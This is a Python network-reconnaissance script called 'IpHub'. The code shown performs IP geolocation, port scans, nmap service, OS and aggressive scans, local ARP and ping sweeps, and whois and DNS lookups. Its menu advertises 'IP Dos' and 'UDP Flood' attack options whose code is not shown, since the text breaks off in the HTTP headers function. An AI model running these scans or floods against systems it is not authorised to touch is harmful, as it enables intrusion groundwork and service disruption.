
#!/usr/bin/env python3
import os
import sys
import socket
import subprocess
import json
import requests
import time
import threading
import random
import re
import ssl
import speedtest
import dns.resolver
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Colors
GREEN = '\033[92m'
BLUE = '\033[94m'
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(f"{GREEN}")
    print(rf" /$$$$$$ /$$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$ ")
    print(rf"|_  $$_/| $$__  $$| $$  | $$| $$  | $$| $$__  $$")
    print(rf"  | $$  | $$  \ $$| $$  | $$| $$  | $$| $$  \ $$")
    print(rf"  | $$  | $$$$$$$/| $$$$$$$$| $$  | $$| $$$$$$$ ")
    print(rf"  | $$  | $$____/ | $$__  $$| $$  | $$| $$__  $$")
    print(rf"  | $$  | $$      | $$  | $$| $$  | $$| $$  \ $$")
    print(rf" /$$$$$$| $$      | $$  | $$|  $$$$$$/ | $$$$$$$/")
    print(rf"|______/|__/      |__/  |__/ \______/  |_______/ ")
    print(f"                                                ")
    print(f"                                                ")
    print(f"                                                {RESET}")
    print(f"{YELLOW}                  Made by marzi tools v2.1 (Early Access){RESET}")
    print(f"{BLUE}                  GitHub: https://github.com/Demon33gio/IpHub.git{RESET}")
    print()

def animate_scanning(text, stop_event):
    chars = ['|', '/', '-', '\\']
    i = 0
    while not stop_event.is_set():
        print(f'\r{BLUE}{text} {chars[i]}{RESET}', end='', flush=True)
        i = (i + 1) % len(chars)
        time.sleep(0.2)

def print_section_header(title):
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{CYAN}{title.center(60)}{RESET}")
    print(f"{CYAN}{'='*60}{RESET}\n")

def print_result(title, value, color=WHITE):
    print(f"{BLUE}{title}: {color}{value}{RESET}")

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_domain(domain):
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$'
    return re.match(pattern, domain) is not None

def print_menu():
    print(f"{CYAN}---------------------- Tools ----------------------{RESET}")
    print(f"[{GREEN}1{RESET}] IP info")
    print(f"[{GREEN}2{RESET}] Port Scan")
    print(f"[{GREEN}3{RESET}] Service detection")
    print(f"[{GREEN}4{RESET}] ARP scanning")
    print(f"[{GREEN}5{RESET}] Ping Sweep")
    print(f"[{GREEN}6{RESET}] NetStat")
    print(f"[{GREEN}7{RESET}] TraceRoute")
    print(f"[{GREEN}24{RESET}] Speed Test")
    print(f"[{GREEN}25{RESET}] DNS Benchmark")
    print(f"[{GREEN}26{RESET}] HTTP/HTTPS Check")
    print(f"[{GREEN}27{RESET}] SSL Check")
    print()
    print(f"{YELLOW}----------------------------- Advanced--------------------------------{RESET}")
    print(f"[{GREEN}8{RESET}] {YELLOW}Advanced IP Scan                  #API#{RESET}")
    print(f"[{GREEN}9{RESET}] OS Detection")
    print(f"[{GREEN}10{RESET}] Get MAC")
    print(f"[{GREEN}11{RESET}] Service Info")
    print(f"[{GREEN}12{RESET}] Whois lookup")
    print(f"[{GREEN}13{RESET}] DNS Lookup")
    print(f"[{GREEN}14{RESET}] Reverse DNS")
    print(f"[{GREEN}15{RESET}] HTTP Headers Check")
    print(f"[{GREEN}28{RESET}] Multi Geolocation")
    print(f"[{GREEN}29{RESET}] Termux Network Info")
    print()
    print(f"{RED}-----------------------------------Attack---------------------------------------{RESET}")
    print(f"[{GREEN}30{RESET}] IP Dos")
    print(f"[{GREEN}31{RESET}] UDP Flood")
    print(f"[{GREEN}32{RESET}] Scan Wifi")
    print(f"[{GREEN}33{RESET}] Vulnerability Scan")
    print()
    print(f"{CYAN}----------------------------- Others----------------------------{RESET}")
    print(f"[{GREEN}16{RESET}] Nmap scan")
    print(f"[{GREEN}17{RESET}] TCP Scan")
    print(f"[{GREEN}18{RESET}] UDP Scan")
    print(f"[{GREEN}19{RESET}] Trace Path")
    print(f"[{GREEN}20{RESET}] Subnet Calculator")
    print(f"[{GREEN}21{RESET}] Blacklist Check")
    print(f"[{GREEN}22{RESET}] Save Results")
    print(f"[{GREEN}23{RESET}] Version")
    print()

def ip_info():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("IP INFORMATION")
        print(f"{BLUE}{{/}} Gathering information...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning, 
                                     args=("Gathering information", stop_event))
        anim_thread.start()
        
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if data['status'] == 'success':
            print_result("IP Address", data.get('query', 'N/A'), GREEN)
            print_result("Country", data.get('country', 'N/A'))
            print_result("Region", data.get('regionName', 'N/A'))
            print_result("City", data.get('city', 'N/A'))
            print_result("ZIP Code", data.get('zip', 'N/A'))
            print_result("Timezone", data.get('timezone', 'N/A'))
            print_result("ISP", data.get('isp', 'N/A'))
            print_result("Organization", data.get('org', 'N/A'))
            print_result("AS", data.get('as', 'N/A'))
            
            lat = data.get('lat')
            lon = data.get('lon')
            if lat and lon:
                print_result("Coordinates", f"{lat}, {lon}")
                print_result("Google Maps", f"https://www.google.com/maps?q={lat},{lon}", YELLOW)
        else:
            print(f"{RED}Error: Could not retrieve information for {ip}{RESET}")
            
    except requests.exceptions.RequestException:
        print(f"{RED}Error: Network connection failed{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def port_scan():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("PORT SCAN")
        print(f"{BLUE}{{/}} Scanning...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning, 
                                     args=("Scanning ports", stop_event))
        anim_thread.start()
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 
                       445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(check_port, common_ports)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if open_ports:
            print(f"{GREEN}Open ports found:{RESET}")
            for port in sorted(open_ports):
                try:
                    service = socket.getservbyport(port)
                    print(f"  {GREEN}└─ {port}/TCP {WHITE}- {service}{RESET}")
                except:
                    print(f"  {GREEN}└─ {port}/TCP {WHITE}- Unknown service{RESET}")
        else:
            print(f"{YELLOW}No open ports found{RESET}")
            
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def service_detection():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("SERVICE DETECTION")
        print(f"{BLUE}{{/}} Detecting services...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Detecting services", stop_event))
        anim_thread.start()
        
        try:
            result = subprocess.run(['nmap', '-sV', '--version-intensity', '2', ip], 
                                  capture_output=True, text=True, timeout=120)
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(f"{YELLOW}Nmap not available. Using basic service detection.{RESET}")
            
            common_services = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
                80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 
                3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL'
            }
            
            found_services = []
            for port, service in common_services.items():
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        result = s.connect_ex((ip, port))
                        if result == 0:
                            found_services.append((port, service))
                except:
                    pass
            
            if found_services:
                print(f"{GREEN}Services detected:{RESET}")
                for port, service in found_services:
                    print(f"  {GREEN}└─ {port}/TCP: {service}{RESET}")
            else:
                print(f"{YELLOW}No common services detected{RESET}")
                
    except subprocess.TimeoutExpired:
        stop_event.set()
        anim_thread.join()
        print(f"\r{RED}Scan timed out{RESET}")
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def arp_scan():
    print_section_header("ARP SCAN")
    print(f"{BLUE}{{/}} Scanning local network...{RESET}", end='', flush=True)
    
    try:
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("ARP scanning", stop_event))
        anim_thread.start()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        subnet = '.'.join(local_ip.split('.')[:3]) + '.0/24'
        print_result("\nNetwork", subnet)
        
        try:
            result = subprocess.run(['arp-scan', '--localnet'], 
                                  capture_output=True, text=True, timeout=30)
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(f"{YELLOW}arp-scan not available. Showing current ARP table.{RESET}")
            
            if os.name == 'posix':
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            else:
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            
            print(result.stdout)
            
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def ping_sweep():
    print_section_header("PING SWEEP")
    print(f"{BLUE}{{/}} Scanning local network...{RESET}", end='', flush=True)
    
    try:
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Ping sweeping", stop_event))
        anim_thread.start()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        subnet = '.'.join(local_ip.split('.')[:3])
        print_result("\nSubnet", f"{subnet}.0/24")
        
        active_hosts = []
        
        def ping_host(host_ip):
            try:
                if os.name == 'posix':
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', host_ip], 
                                          capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        active_hosts.append(host_ip)
                else:
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', host_ip], 
                                          capture_output=True, text=True, timeout=2)
                    if "Reply from" in result.stdout:
                        active_hosts.append(host_ip)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            for i in range(1, 255):
                host_ip = f"{subnet}.{i}"
                executor.submit(ping_host, host_ip)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if active_hosts:
            print(f"{GREEN}Active hosts found:{RESET}")
            for host in sorted(active_hosts):
                print(f"  {GREEN}└─ {host}{RESET}")
            print(f"\n{BLUE}Total active hosts: {GREEN}{len(active_hosts)}{RESET}")
        else:
            print(f"{YELLOW}No active hosts found{RESET}")
            
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def netstat():
    print_section_header("NETSTAT")
    print(f"{BLUE}{{/}} Gathering network statistics...{RESET}", end='', flush=True)
    
    try:
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Running netstat", stop_event))
        anim_thread.start()
        
        if os.name == 'posix':
            result = subprocess.run(['netstat', '-tunap'], 
                                  capture_output=True, text=True, timeout=10)
        else:
            result = subprocess.run(['netstat', '-ano'], 
                                  capture_output=True, text=True, timeout=10)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        print(result.stdout)
        
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def traceroute():
    print(f"{CYAN}{{¿}} Enter IP or hostname{RESET}")
    host = input("> ").strip()
    
    if not host:
        print(f"{RED}Error: Please enter a valid host{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("TRACEROUTE")
        print(f"{BLUE}{{/}} Tracing route...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Tracing route", stop_event))
        anim_thread.start()
        
        if os.name == 'posix':
            result = subprocess.run(['traceroute', host], 
                                  capture_output=True, text=True, timeout=60)
        else:
            result = subprocess.run(['tracert', host], 
                                  capture_output=True, text=True, timeout=60)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        print(result.stdout)
        
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def advanced_ip_scan():
    print(f"{YELLOW}  __________________{RESET}")
    print(f"{YELLOW} /                  \\{RESET}")
    print(f"{YELLOW}|       APIS        |{RESET}")
    print(f"{YELLOW} \\__________________/{RESET}")
    print()
    
    apis = {
        'ipinfo': {
            'name': 'IPInfo',
            'url': 'https://ipinfo.io/',
            'key_required': False,
            'key': ''
        }
    }
    
    for api_name, api_data in apis.items():
        if api_data['key_required']:
            print(f"{CYAN}Enter {api_data['name']} API key (press Enter to skip):{RESET}")
            print(f"{GREEN}Link: {YELLOW}{api_data['url']}{RESET}")
            key = input("> ")
            if key:
                apis[api_name]['key'] = key
    
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("ADVANCED IP SCAN")
        
        for api_name, api_data in apis.items():
            if api_data['key_required'] and not api_data['key']:
                continue
                
            print(f"{CYAN}Trying {api_data['name']} API...{RESET}")
            
            try:
                if api_name == 'ipinfo':
                    url = f"https://ipinfo.io/{ip}/json"
                    response = requests.get(url, timeout=10)
                    data = response.json()
                    
                    print_result("IP", data.get('ip', 'N/A'), GREEN)
                    print_result("Hostname", data.get('hostname', 'N/A'))
                    print_result("City", data.get('city', 'N/A'))
                    print_result("Region", data.get('region', 'N/A'))
                    print_result("Country", data.get('country', 'N/A'))
                    print_result("Location", data.get('loc', 'N/A'))
                    print_result("Organization", data.get('org', 'N/A'))
                    print_result("Postal", data.get('postal', 'N/A'))
                    print_result("Timezone", data.get('timezone', 'N/A'))
                    
                print(f"{CYAN}\nRaw API response:{RESET}")
                print(json.dumps(data, indent=2))
                
            except Exception as e:
                print(f"{RED}Error with {api_data['name']} API: {str(e)}{RESET}")
                
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def os_detection():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("OS DETECTION")
        print(f"{BLUE}{{/}} Detecting OS...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Detecting OS", stop_event))
        anim_thread.start()
        
        try:
            result = subprocess.run(['nmap', '-O', '--osscan-limit', ip], 
                                  capture_output=True, text=True, timeout=120)
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(f"{YELLOW}Nmap not available. Using TTL-based OS detection.{RESET}")
            
            try:
                if os.name == 'posix':
                    result = subprocess.run(['ping', '-c', '1', ip], 
                                          capture_output=True, text=True, timeout=5)
                else:
                    result = subprocess.run(['ping', '-n', '1', ip], 
                                          capture_output=True, text=True, timeout=5)
                
                output = result.stdout
                ttl = None
                
                if "ttl=" in output.lower():
                    ttl_line = [line for line in output.split('\n') if "ttl=" in line.lower()][0]
                    ttl_match = re.search(r'ttl=(\d+)', ttl_line.lower())
                    if ttl_match:
                        ttl = int(ttl_match.group(1))
                
                if ttl:
                    print_result("TTL", ttl)
                    if ttl <= 64:
                        print_result("Possible OS", "Linux/Unix", GREEN)
                    elif ttl <= 128:
                        print_result("Possible OS", "Windows", GREEN)
                    else:
                        print_result("Possible OS", "Network device or other", YELLOW)
                else:
                    print(f"{YELLOW}Could not determine TTL{RESET}")
                    
            except:
                print(f"{RED}Error pinging host{RESET}")
                
    except subprocess.TimeoutExpired:
        stop_event.set()
        anim_thread.join()
        print(f"\r{RED}Scan timed out{RESET}")
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def get_mac():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("MAC ADDRESS LOOKUP")
        print(f"{BLUE}{{/}} Finding MAC address...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Finding MAC", stop_event))
        anim_thread.start()
        
        mac_address = None
        
        if os.name == 'posix':
            subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                         capture_output=True, timeout=5)
            
            result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
            output = result.stdout
            
            if ip in output:
                lines = output.split('\n')
                for line in lines:
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            mac_address = parts[2]
                            break
                            
        else:
            subprocess.run(['ping', '-n', '1', '-w', '1000', ip], 
                         capture_output=True, timeout=5)
            
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            output = result.stdout
            
            if ip in output:
                lines = output.split('\n')
                for line in lines:
                    if ip in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            mac_address = parts[1]
                            break
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if mac_address:
            print_result("IP Address", ip, GREEN)
            print_result("MAC Address", mac_address)
        else:
            print(f"{YELLOW}Could not find MAC address for {ip}{RESET}")
            
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def service_info():
    print(f"{CYAN}{{¿}} Enter port number{RESET}")
    port_input = input("> ").strip()
    
    try:
        port = int(port_input)
        if not (1 <= port <= 65535):
            print(f"{RED}Error: Port must be between 1 and 65535{RESET}")
            input("\nPress Enter to continue...")
            return
            
        print_section_header("SERVICE INFORMATION")
        
        try:
            service = socket.getservbyport(port)
            print_result("Port", port, GREEN)
            print_result("Service", service)
            
            service_descriptions = {
                21: "File Transfer Protocol",
                22: "Secure Shell",
                23: "Telnet",
                25: "Simple Mail Transfer Protocol",
                53: "Domain Name System",
                80: "Hypertext Transfer Protocol",
                110: "Post Office Protocol v3",
                143: "Internet Message Access Protocol",
                443: "Hypertext Transfer Protocol Secure",
                993: "IMAP over SSL",
                995: "POP3 over SSL",
                3306: "MySQL Database Service",
                3389: "Remote Desktop Protocol",
                5432: "PostgreSQL Database Service"
            }
            
            if port in service_descriptions:
                print_result("Description", service_descriptions[port])
                
        except:
            print_result("Port", port, GREEN)
            print(f"{YELLOW}Unknown service on port {port}{RESET}")
            
    except ValueError:
        print(f"{RED}Error: Port must be a number{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def whois_lookup():
    print(f"{CYAN}{{¿}} Enter IP or domain{RESET}")
    target = input("> ").strip()
    
    if not target:
        print(f"{RED}Error: Please enter a valid target{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("WHOIS LOOKUP")
        print(f"{BLUE}{{/}} Querying WHOIS...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("WHOIS lookup", stop_event))
        anim_thread.start()
        
        try:
            if os.name == 'posix':
                result = subprocess.run(['whois', target], 
                                      capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(['whois', target], 
                                      capture_output=True, text=True, timeout=30)
            
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(f"{YELLOW}whois command not available.{RESET}")
            print(f"{GREEN}Online WHOIS: {YELLOW}https://www.whois.com/whois/{target}{RESET}")
            
    except subprocess.TimeoutExpired:
        stop_event.set()
        anim_thread.join()
        print(f"\r{RED}WHOIS query timed out{RESET}")
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def nmap_scan():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("NMAP SCAN")
        print(f"{BLUE}{{/}} Running Nmap...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Nmap scanning", stop_event))
        anim_thread.start()
        
        try:
            result = subprocess.run(['nmap', '-v', '-A', '--reason', ip], 
                                  capture_output=True, text=True, timeout=300)
            
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
            if result.stderr:
                print(f"{RED}Errors:{RESET}")
                print(result.stderr)
                
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            print(f"\r{RED}Nmap is not installed. Please install nmap to use this feature.{RESET}")
            
    except subprocess.TimeoutExpired:
        stop_event.set()
        anim_thread.join()
        print(f"\r{RED}Nmap scan timed out{RESET}")
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def tcp_scan():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("TCP SCAN")
        print(f"{BLUE}{{/}} Scanning TCP ports...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("TCP scanning", stop_event))
        anim_thread.start()
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 
                       445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            executor.map(check_port, common_ports)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if open_ports:
            print(f"{GREEN}Open TCP ports found:{RESET}")
            for port in sorted(open_ports):
                try:
                    service = socket.getservbyport(port)
                    print(f"  {GREEN}└─ {port}/TCP {WHITE}- {service}{RESET}")
                except:
                    print(f"  {GREEN}└─ {port}/TCP {WHITE}- Unknown service{RESET}")
        else:
            print(f"{YELLOW}No open TCP ports found{RESET}")
            
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def udp_scan():
    print(f"{CYAN}{{¿}} Enter IP{RESET}")
    ip = input("> ")
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("UDP SCAN")
        print(f"{BLUE}{{/}} Scanning UDP ports...{RESET}", end='', flush=True)
        print(f"\n{YELLOW}Note: UDP scanning can be slow and unreliable.{RESET}")
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("UDP scanning", stop_event))
        anim_thread.start()
        
        common_ports = [53, 67, 68, 69, 123, 135, 137, 138, 139, 161, 162, 
                       445, 514, 631, 1434, 1900, 4500, 49152]
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(2)
                    s.sendto(b'', (ip, port))
                    try:
                        data, addr = s.recvfrom(1024)
                        open_ports.append(port)
                    except socket.timeout:
                        pass
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_port, common_ports)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if open_ports:
            print(f"{GREEN}Responsive UDP ports found:{RESET}")
            for port in sorted(open_ports):
                try:
                    service = socket.getservbyport(port, 'udp')
                    print(f"  {GREEN}└─ {port}/UDP {WHITE}- {service}{RESET}")
                except:
                    print(f"  {GREEN}└─ {port}/UDP {WHITE}- Unknown service{RESET}")
        else:
            print(f"{YELLOW}No responsive UDP ports found{RESET}")
            
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def trace_path():
    print(f"{CYAN}{{¿}} Enter IP or hostname{RESET}")
    host = input("> ").strip()
    
    if not host:
        print(f"{RED}Error: Please enter a valid host{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("TRACE PATH")
        print(f"{BLUE}{{/}} Tracing path...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Tracing path", stop_event))
        anim_thread.start()
        
        if os.name == 'posix':
            result = subprocess.run(['tracepath', host], 
                                  capture_output=True, text=True, timeout=60)
        else:
            result = subprocess.run(['tracert', host], 
                                  capture_output=True, text=True, timeout=60)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        print(result.stdout)
        
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def dns_lookup():
    print(f"{CYAN}{{¿}} Enter domain name{RESET}")
    domain = input("> ").strip()
    
    if not validate_domain(domain):
        print(f"{RED}Error: Invalid domain format{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("DNS LOOKUP")
        print(f"{BLUE}{{/}} Resolving DNS...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Resolving DNS", stop_event))
        anim_thread.start()
        
        addresses = socket.getaddrinfo(domain, None)
        ip_list = set()
        
        for addr in addresses:
            ip_list.add(addr[4][0])
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        if ip_list:
            print(f"{GREEN}IP addresses found for {domain}:{RESET}")
            for ip in ip_list:
                print(f"  {GREEN}└─ {ip}{RESET}")
        else:
            print(f"{YELLOW}No IP addresses found for {domain}{RESET}")
            
    except socket.gaierror:
        print(f"{RED}Error: Could not resolve domain{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def reverse_dns_lookup():
    print(f"{CYAN}{{¿}} Enter IP address{RESET}")
    ip = input("> ").strip()
    
    if not validate_ip(ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("REVERSE DNS LOOKUP")
        print(f"{BLUE}{{/}} Performing reverse lookup...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Reverse DNS lookup", stop_event))
        anim_thread.start()
        
        hostname, aliases, _ = socket.gethostbyaddr(ip)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        print_result("IP Address", ip, GREEN)
        print_result("Hostname", hostname)
        if aliases:
            print_result("Aliases", ", ".join(aliases))
            
    except socket.herror:
        print(f"{YELLOW}No reverse DNS record found for {ip}{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def http_headers_check():
    print(f"{CYAN}{{¿}} Enter URL{RESET}")
    url = input("> ").strip()
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    try:
        print_section_header("HTTP HEADERS CHECK")
